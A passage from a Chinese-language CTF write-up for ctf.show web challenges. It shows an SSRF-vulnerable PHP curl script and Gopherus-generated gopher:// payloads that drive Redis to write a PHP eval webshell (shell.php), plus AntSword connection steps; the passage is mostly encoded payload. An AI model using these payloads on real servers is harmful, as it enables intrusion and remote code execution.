class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>然后访问1.php确认写入成功，蚁剑连接<a href="http://03f79a31-b12e-4aaf-ba66-ec32a9754f49.challenge.ctf.show/1.php">http://03f79a31-b12e-4aaf-ba66-ec32a9754f49.challenge.ctf.show/1.php</a></p><hr><h2 id="web-360（打redis）"><a href="#web-360（打redis）" class="headerlink" title="web-360（打redis）"></a>web-360（打redis）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>用工具生成payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> gopherus.py --exploit redis<br><br><span class="hljs-attribute">php</span><br><br><span class="hljs-section">&lt;?php eval($_POST[1]);?&gt;</span><br><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2428</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_post%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2424</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_post%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p>再次编码得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span 